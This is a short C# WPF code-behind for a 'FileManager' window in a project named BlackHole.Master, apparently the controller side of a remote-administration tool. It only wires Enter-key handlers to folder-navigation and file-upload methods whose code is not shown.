﻿using BlackHole.Common.Network.Protocol;
using BlackHole.Master.Model;
using BlackHole.Master.Remote;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace BlackHole.Master
{
    /// <summary>
    /// Logique d'interaction pour FileManager.xaml
    /// </summary>
    public partial class FileManager : SlaveWindow
    {
        /// <summary>
        /// 
        /// </summary>
        public FileManager()
        {
            InitializeComponent();      
        }

        private void TxtBoxDirectory_KeyDown(object sender, KeyEventArgs e)
        {
            switch(e.Key)
            {
                case Key.Enter:
                    NavigateToTypedFolder();
                    break;
            }
        }

        private void TxtBoxUpload_KeyDown(object sender, KeyEventArgs e)
        {
            switch (e.Key)
            {
                case Key.Enter:
                    UploadTypedFile();
                    break;
            }
        }
    }
}
